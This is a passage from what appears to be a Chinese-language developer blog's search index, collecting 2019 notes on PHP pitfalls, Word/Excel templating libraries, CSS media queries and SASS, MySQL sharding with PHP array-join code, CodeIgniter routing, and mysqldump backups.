","date":"2019-05-09","objectID":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:2:0","tags":["mysql","doc","php"],"title":"MySQL轉出DB設計文件方法","uri":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近 php 預設設個錯誤 但我程式沒有寫錯… 後來找了一下，參照不能代入 function 裡面 如這個$price = array_shift(get_product_price($product_key)); 因為忘了第二次，所以獨立寫一篇 $product_price = get_product_price($product_key); $price = array_shift($product_price); 臨時筆記: ［PHP］Error: Only variables should be passed by reference PHP 有關參照(Reference)的那些事 | 程式狂想筆記其實我以前就有提到 orz ","date":"2019-05-09","objectID":"/blog/posts/Strict-Standards-Only-variables-should-be-passed-by-reference/:0:0","tags":["php"],"title":"Strict Standards: Only variables should be passed by reference","uri":"/blog/posts/Strict-Standards-Only-variables-should-be-passed-by-reference/"},{"categories":["PHP"],"content":"最近專案目前沒有現在時間資料 只有過去資料(產生當日排程還沒寫完) 但是為了要讓當然排名正常 所以我想了一個寫指定抓固定日期方法 function fakeDay( $nowDay = null ){ if(!isset($nowDay)){ $nowDay = date('Y-m-d'); } $today = $nowDay; $firstday = '2018-01-01'; //寫入有資料的區間 $lastday = '2018-12-31'; //寫入有資料的區間 $firstday_unixday = strtotime( $firstday ) / (60*60*24); $lastday_unixday = strtotime( $lastday ) / (60*60*24); $range = ($lastday_unixday - $firstday_unixday + 1 ) \u003e 0 ? ($lastday_unixday - $firstday_unixday + 1 ) : 1; $add_date = (strtotime($today)/(60*60*24)) % $range; $fake_today = date('Y-m-d', strtotime(\"$firstday + $add_date day\")); echo $fake_today; } echo fakeDay() . \"\\n\"; echo fakeDay(date('Y-m-d',strtotime('now + 1 day'))) . \"\\n\"; http://sandbox.onlinephpfunctions.com/code/10c72c5b521557c14f61d73e702864037a9d2d52 簡單小記 PHP 參照運算式不能寫在 function 裡面，如這邊問題 由於 php function 能設定預設值，但沒辦法function fakeDay($nowDay = date('Y-m-d')){...} 正常會寫 isset()去做預設值方法 參考連結: date - how to pass current year as default argument in php function - Stack Overflow ","date":"2019-05-09","objectID":"/blog/posts/%E9%9A%A8%E6%A9%9F%E7%95%B6%E5%A4%A9%E6%8C%87%E5%AE%9A%E5%9B%BA%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:0:0","tags":["php","date"],"title":"隨機當天指定固定日期方法","uri":"/blog/posts/%E9%9A%A8%E6%A9%9F%E7%95%B6%E5%A4%A9%E6%8C%87%E5%AE%9A%E5%9B%BA%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近朋友問我有沒有用程式方法套進去 Word 不過我平常沒有這個需求 我是有跟他提到有 合併列印、VBA 但是查了一下 竟然發現找到【茶包射手日記】純 JavaScript DOCX 套版元件 Debug-黑暗執行緒 原來網頁版 js 就能做到這種事 但我覺得應該還有很多東西 所以整理一下 因為我有先找到js-excel-template - npm 內容兩個圖片，就讓我想馬上測試官網的範例 首先有很複雜的表不建議使用這個 sheet 多筆資料不會套用 塞多筆 table 資料，可能下面用總計，不會自動往下移 Excel 有設定一些格式不會用 測試程式 const JsExcelTemplate = require(\"js-excel-template/nodejs/nodejs\").default; const excelTemplate = JsExcelTemplate.fromFile(\"test.xlsx\"); excelTemplate.set(\"name\", \"John\"); excelTemplate.set(\"age\", 123); excelTemplate.set(\"now\", new Date()); excelTemplate.set(\"isBoy\", true); excelTemplate.set(\"isGirl\", false); const students = [ { name: \"Tommy\", age: 12 }, { name: \"Philips\", age: 13 }, { name: \"Sara\", age: 14 }, { name: \"中文測試\", age: 14 } ]; for (let i = 1; i \u003c= 5; i++) { if (i \u003c= students.length) { excelTemplate.set(`name${i}`, students[i - 1].name); excelTemplate.set(`age${i}`, students[i - 1].age); } else { excelTemplate.set(`name${i}`, \"\"); excelTemplate.set(`age${i}`, \"\"); } } excelTemplate.set( \"average\", students.reduce((p, c) =\u003e p + c.age, 0) / students.length ); excelTemplate.set(\"students\", students); // nodejs: excelTemplate.saveAs(\"out.xlsx\"); 雖然不推薦，但適合做單頁式報表 Templater - reporting Library for .NET and Java GitHub - wilson6/NPOI-Template: C# 根据 NPOI 模版去生成复杂的 EXCEL 表格，标签化。 GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself GitHub - ivahaev/go-xlsx-templater: Simple xlsx template based document generator GitHub - ngs-doo/TemplaterExamples: Creating reports in .NET and Java GitHub - anmoroz/xlsx-template-php: A library for templating of Excel Office documents. Supports MS Excel xlsx. Uses PHPExcel library. GitHub - optimistex/xlsx-template-ex: The template engine for generate xlsx documents poi-tl GitHub - shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents. GitHub - guigrpa/docx-templates: Template-based docx report creation GitHub - legion-zver/go-docx-templates GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy. GitHub - guigrpa/docx-templates: Template-based docx report creation … 太多了，不列了 目前GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy.、GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself這幾個星星數比較多 Exwog - from Excel to Word reports generator (xls to doc, xlsx to docx) by template GitHub - HY-Org/hy.common.report: 报表、Excel 操作类库。Java 转 Excel、Excel 转 Java GitHub - hanzhaoxin/ExcelReport: This reporting engine is built on NPOI. GitHub - Jimmy-JS/laravel-report-generator: Rapidly Generate Simple Pdf, CSV, \u0026 Excel Report Package on Laravel GitHub - biezhi/excel-plus: ❇️ Improve the productivity of the Excel operation library. https://git.io/vNjQy 2019-09-08 可以看這篇php-excel-templator 用範本(template)快速產生Excel方法 | 程式狂想筆記 ","date":"2019-05-05","objectID":"/blog/posts/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/:0:0","tags":["word","excel","template"],"title":"Word,Excel的相關template套件小記","uri":"/blog/posts/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"最近看 SASS 有設定@media 方法 再仔細查了一下，還有別種寫法 有看到一些自己不會這樣寫的 特別筆記一下 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:0:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"一般常見寫法 一般常見這種寫法 @media screen and (min-width: 400px) and (max-width: 700px) 這種寫法順序會比較安全 @media screen and (min-width: 400px) and (max-width: 700px) { .header { } } ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:1:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"特別寫法 在使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more裡面有看到這種寫法 .div{ //desktop @media all and (min-width: 960px) { padding:20px; } //pad @media all and (min-width: 760px) and (max-width: 959px) { padding:10px; } //mini pad @media all and (min-width: 480px) and (max-width: 759px) { padding:5px; } //mobile @media all and (max-width: 480px) { padding:0px; } } } 沒想到 media 可以放在裡面 這樣寫也比較不會亂 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:2:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"簡單寫法(需要小心順序) .header { padding: 20px; } //pad @media (max-width: 959px) { .header { padding: 10px; } } //mini pad @media (max-width: 759px) { .header { padding: 5px; } } //mobile @media (max-width: 480px) { .header { padding: 0px; } } 建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。 這種寫法可能需要注意順序，可參考@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:3:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"SASS 寫法 用 mixin 方法，但這邊使用上面簡單方法設定 // device $mobile: 568px; $pad: 768px; $desktop: 960px; // color $red: #ff0000; $black: #000; @mixin mobile { @media (max-width: $mobile) { @content; } } @mixin pad { @media (max-width: $pad) { @content; } } @mixin desktop { @media (max-width: $desktop) { @content; } } .header{ color: $black; @include pad{ color: $red; } @include mobile{ display: none; } } ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:4:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"深入了解 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:5:0","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"@media max-width 和 min-width 順序問題 深入了解@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客 @media (max-width: 959px) //裝置小於 959 會進來 @media (max-width: 759px) //裝置小於 759 會進來 @media (max-width: 480px) //裝置小於 480 會進來 但是寫反會遇到什麼事情 裝置 300 因為 CSS 順序關係，所以會吃到 959 的設定 @media (max-width: 480px) //裝置小於 480 會進來 @media (max-width: 759px) //裝置小於 759 會進來 @media (max-width: 959px) //裝置小於 959 會進來 @media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客 簡單口決真的記得 建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:5:1","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"@media 的 screen 可以省略 為什麼我看有些 code 裡面的@media 可以省略? 翻了@media - CSS | MDN沒有寫 不過找到前端新手村 Media Query - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 裡面有提 media type 是 all 時，可以省略。 不過我之前專案有用到@media print 功能 只要用 CSS 就能調整列印樣式 真的是很方便 Print —— 被埋没的 Media Type – 腾讯 CDC ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:5:2","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"有關於 compass 當出學 SASS 的時候，有看到 compass 但最近感覺很少人提到 compass 所以我有查了一下 原來 compass 已經很久沒更新了 Compass 有哪些好處呢?裡面[scss]Compass | hannahpun裡面 2 個我覺得不錯 Sprite Helper 函數( image-width,image-height 太神!!!) 取代 compass 我查到用 gulp 或 webpack 做 sprite、CSS3 各瀏覽器的 CSS 可以通過 postcss 解決 Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限 Compass 替代方案(2) - 透過 PostCSS，停止加入不必要的 prefix | 卡斯伯 Blog - 前端，沒有極限 Compass 替代方案(3) - 加入 SVG Sprites | 卡斯伯 Blog - 前端，沒有極限 上面有機會用的話，再來詳細筆記 PS: 當然 image-width,image-height 目前沒有解決方案 參考來源： Mobile Web 前端技術筆記(二): Media Queries 與 CSS – 烏托比亞 @media screen 的书写顺序 - WEB 前端娃——steiny - CSDN 博客 使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more CSS Media Queries 詳細介紹 - OXXO.STUDIO [scss]Compass | hannahpun Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限 Sass 的@import @mixin @content @extend 與@function « StevenTTuD’s notes Sass 教學 (11) - @content - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2019-05-05","objectID":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/:5:3","tags":["css","RWD","media"],"title":"CSS設定響應式(RWD)有幾種方法","uri":"/blog/posts/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"之前有做 Sharding 簡單紀錄MySQL 不錯優化文章\u0026DB 雜記 | 程式狂想筆記 最近工作上發現我還是沒有很了解 Sharding 在工作上有很大的誤解 當然這篇不會記錄到很深入 只是記錄我的錯誤觀念改正 ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:0:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"首先做 Sharding，不能做 join 動作 因為先前開會，對方沒有講很清楚 我以為部分資料表可以同步到別的 Database 想說還是能做 join 問題 (沒想到沒有適用 mariadb sharding 功能) 但是，最近問相關問題的時候 問到 join 相關事情，有得到消息是不能做join事情 當然也不會使用到類似 MariaDB Spider 東西 連線所有抓資料要用程式處理 當然有些 count,group by 動作可能都用程式處理了 當然想說這麼複雜的東西交給工程師用很冏 3、跨節點合併排序分頁問題 一旦進行了數據的水平切分之後，可能就並不僅僅只有跨節點 Join 無法正常運行，有些排序分頁的 Query 語句的數據源可能也會被切分到多個節點，這樣造成的直接後果就是這些排序分頁 Query 無法繼續正常運行。其實這和跨節點 Join 是一個道理，數據源存在於多個節點上，要通過一個 Query 來解決，就和跨節點 Join 是一樣的操作。同樣 Federated 也可以部分解決，當然存在的風險也一樣。 還是同樣的問題，怎麼辦？我同樣仍然繼續建議通過應用程序來解決。 如何解決？解決的思路大體上和跨節點 Join 的解決類似，但是有一點和跨節點 Join 不太一樣，Join 很多時候都有一個驅動與被驅動的關係，所以 Join 本身涉及到的多個表之間的數據讀取一般都會存在一個順序關係。但是排序分頁就不太一樣了，排序分頁的數據源基本上可以說是一個表（或者一個結果集），本身並不存在一個順序關係，所以在從多個數據源取數據的過程是完全可以並行的。這樣，排序分頁數據的取數效率我們可以做的比跨庫 Join 更高，所以帶來的性能損失相對的要更小，在有些情況下可能比在原來未進行數據切分的數據庫中效率更高了。當然，不論是跨節點 Join 還是跨節點排序分頁，都會使我們的應用服務器消耗更多的資源，尤其是內存資源，因為我們在讀取訪問以及合併結果集的這個過程需要比原來處理更多的數據。 分析到這裡，可能很多讀者朋友會發現，上面所有的這些問題，我給出的建議基本上都是通過應用程序來解決。大家可能心裡開始犯嘀咕了，是不是因為我是 DBA，所以就很多事情都扔給應用架構師和開發人員了？ 其實完全不是這樣，首先應用程序由於其特殊性，可以非常容易做到很好的擴展性，但是數據庫就不一樣，必須借助很多其他的方式才能做到擴展，而且在這個擴展過程中，很難避免帶來有些原來在集中式數據庫中可以解決但被切分開成一個數據庫集群之後就成為一個難題的情況。要想讓系統整體得到最大限度的擴展，我們只能讓應用程序做更多的事情，來解決數據庫集群無法較好解決的問題。 作者：浮浮尘尘 链接：https://www.jianshu.com/p/6ebafabfddae 来源：简书 简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 看著看著眼淚掉出來 数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客 MySQL Sharding 详解 - 简书 MySQL 分库分表，写得太好了！ - 51CTO.COM MySQL 上 sharding 的方案 | Gea-Suan Lin’s BLOG MySQL 不錯優化文章\u0026DB 雜記 | 程式狂想筆記 数据库 Sharding 的基本思想和切分策略（分库分表） | 忆桐之家的博客 方案虽好，成本先行：数据库 Sharding+Proxy 实践解析 - MySQL - dbaplus 社群：围绕 Data、Blockchain、AiOps 的企业级专业社群。技术大咖、原创干货，每天精品原创文章推送，每周线上技术分享，每月线下技术沙龙。 MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀 MySql 从一窍不通到入门（九）Sharding 的实现和规避 - Invoker’s Tower - CSDN 博客 现在 mysql 的分布式数据访问层主流方案有哪些? - 知乎 传统分库分表(sharding)的缺陷与破解之法-云栖社区-阿里云 ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:1:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"分表方式 用非 Sharding 某一張記錄 sharding，如MySQL 分库分表，写得太好了！ - 51CTO.COM 用程式去做導向動作 用%(程式餘數)去做分割 當初看這段有想到之後擴增 Sharding 不是要做資料轉移 剛好這篇有提到 数据库 sharding 和一致性哈希算法 - 言川的博客 - CSDN 博客 擴增事要做資料轉移的 現有 code，可以參考 open bilibili 有實作這個功能 XDD ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:2:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"Sharding 各 table 的主鍵 id 不能重複 Sharding DB 設定 auto_increment 起始不一樣。(ex:DB1 0, DB2 10000000) 拿不會重複資料串流水號，(EX:(USER_ID)UUID+id) ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:3:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"另類 DB 實作作法 Vitess 就是由 Youtube 團隊為了解決資料量龐大、邏輯複雜導致 Query 的錯誤率升高，讓 Youtube 工程團隊有解不完的 Bug、加不完的班。又幸好當時寫這套前端窗口的人致力開源這份程式碼，才讓後世的人能不用辛苦地寫一份這種可怕的東西(我想也沒多少人寫得出來)。 对比 Vitess，ShardingSphere 有哪些不同 Mysql — sharding , partitioning | Richard’s Blog kingshard kingshard/how_to_use_kingshard.md at master · flike/kingshard · GitHub ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:4:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"我有個大膽的想法 如果兩個 Array 做 join 動作有什麼做法? 後來有找到這個 LINQ PHP 比較：YaLinqo，Ginq，PinqWeb 開發幫酷 YaLinqo port de .NET 4 LINQ vers PHP - Par l’exemple Yalinqo 裡面的 join 跟 SQL Join 好像不太一樣 當然也有找到程式自幹的，How to simulate the SQL LEFT JOIN operation using PHP arrays? - Stack Overflow //function to simulate the left join function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){ $final= array(); if(empty($right_join_on)) $right_join_on = $left_join_on; foreach($left AS $k =\u003e $v){ $final[$k] = $v; foreach($right AS $kk =\u003e $vv){ if($v[$left_join_on] == $vv[$right_join_on]){ foreach($vv AS $key =\u003e $val) $final[$k][$key] = $val; } else { foreach($vv AS $key =\u003e $val) $final[$k][$key] = NULL; } } } return $final; } 比較特別要 join 兩個欄位，名稱可以不一樣，所以後面兩個參數是用來對應關聯屬性 我這邊有簡單實作PHP Sandbox, test PHP online, PHP tester 後來發現 join 空資料時候會有問題，小小修正 function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){ $final= array(); if(empty($right_join_on)) $right_join_on = $left_join_on; foreach($left AS $k =\u003e $v){ $final[$k] = $v; foreach($right AS $kk =\u003e $vv){ if($v[$left_join_on] == $vv[$right_join_on]){ foreach($vv AS $key =\u003e $val) $final[$k][$key] = $val; } else { foreach($vv AS $key =\u003e $val){ if($key == $left_join_on) continue; $final[$k][$key] = NULL; } } } } return $final; } 改寫 inner join function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){ $final= array(); if(empty($right_join_on)) $right_join_on = $left_join_on; foreach($left AS $k =\u003e $v){ foreach($right AS $kk =\u003e $vv){ if($v[$left_join_on] == $vv[$right_join_on]){ $final[$k] = $v; foreach($vv AS $key =\u003e $val) $final[$k][$key] = $val; } } } return $final; } ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:5:0","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"找到其他套件 GitHub - erdalceylan/array-join: php array join ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:5:1","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"排序問題 php - How to Sort Multi-dimensional Array by Value? - Stack Overflow ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:5:2","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"效能上的問題 其次你 left_join_array 功能是一個問題，它的速度是 O(n^3)，速度很慢，並儘可能內存去你分配噸也是如此，但在我們談論如何優化數據之前，我需要更多關於您想要處理數據的信息。 MySQL 將總是比任何你能在幾分鐘內寫速度更快，尤其是如果你沒有關於如何 RDBMS 工作的任何知識。您可以儘可能多地模擬它，但 MySQL 應該至少快一個數量級; MySQL 的連接算法是 O((nm) log(nm))，你的算法指數級地慢（字面上）。 PHP 脚本 - VoidCC algorithm - PHP script for optimizing loading CSV data - Stack Overflow 請用在資料少上面 ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:5:3","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"物件快速轉陣列方法 json_decode(json_encode(\\$products), true); Convert PHP object to associative array - Stack Overflow 其他想到再補… 2020-06-13 最近在看 Procedure stored 處理大量資料是不是最好解 看起來大量資料是… 在這之間有查到 sharding 文章覺得不錯，並整理一下 寫好SQL很有必要！ - 數據分析那些事 - Medium 備份圖 分庫分表的基本思想 - -j神—– - 博客園 備份圖 其他沒相關的整理 使用非同步處理提升資料庫更新速度-黑暗執行緒 oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow 2020-06-18 一次分表踩坑实践的探讨 - 云+社区 - 腾讯云 sharding 做報表還是很大的難題阿!! SpringBoot2.x集成Sharding-JDBC实现分库分表 - 简书 Spring boot+mybatis+mysql+ sharding-jdbc实现分库分表学习demo - 簡書 為什麼要用spring-data-jpa而不直接用hibernate | 程式前沿 ","date":"2019-05-03","objectID":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/:5:4","tags":["sharding","mysql"],"title":"MySQL sharding初步認識小記","uri":"/blog/posts/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"今天設定 Codeigniter 路由的時候 發現怎麼不能正常倒到 Default_controller 後來發現不能設定 Contoller 第二層資料夾!!! 好了，結束 XD 最後，不太想動到原本路徑程式， 所以 Welcome.php 做inlcude application\\contoller\\ooo\\xxx.php繼承(extends) 完成!!!! 注意：設邊由於所有 index.php 關係，所以 include 要由底層資料夾開始 其他小記: 怕沒有時間記錄，小記在這邊 Git webhook 实现自动部署教程 Windows 系统中的 Linux—WSL 安装及简单使用-水幕青辰的网络笔记-51CTO 博客 ","date":"2019-05-03","objectID":"/blog/posts/codeigniter%E8%A8%AD%E5%AE%9Arouter%E8%B8%A9%E9%9B%B7/:0:0","tags":["codeigniter"],"title":"codeigniter設定router踩雷","uri":"/blog/posts/codeigniter%E8%A8%AD%E5%AE%9Arouter%E8%B8%A9%E9%9B%B7/"},{"categories":["MySQL"],"content":"最近要本機測試資料 但是要如何不中斷服務又能快速備份的方法 最後想到有 mysqldump 之前有想過 mysqldump 是 DBA 才會用到工具 但我又不需要全部備份 不知道有沒有什麼快速匯出但是數量不想要太多 最後有找到很快的方法 ","date":"2019-04-25","objectID":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/:0:0","tags":["mysqldump","mysql"],"title":"mysqldump備份database固定量資料","uri":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/"},{"categories":["MySQL"],"content":"使用方法 mysqldump -uroot -p123 test \u003e c:\\test.sql 注意-u 和-p 後面帳號密碼要連在一起 參考:鯉魚智缺熊的網智: windows 下使用 command line dump \u0026 import mysql 但注意!!用 mysqldump 是會 lock DB 的 MyISAM tables require this locking because they don’t support transactions. However, InnoDB (the default storage engine as of MySQL 5.5.5) supports transactions. Mysqldump defaults to a conservative setting of locking everything, but we don’t need to use that default - we an avoid locking tables completely. 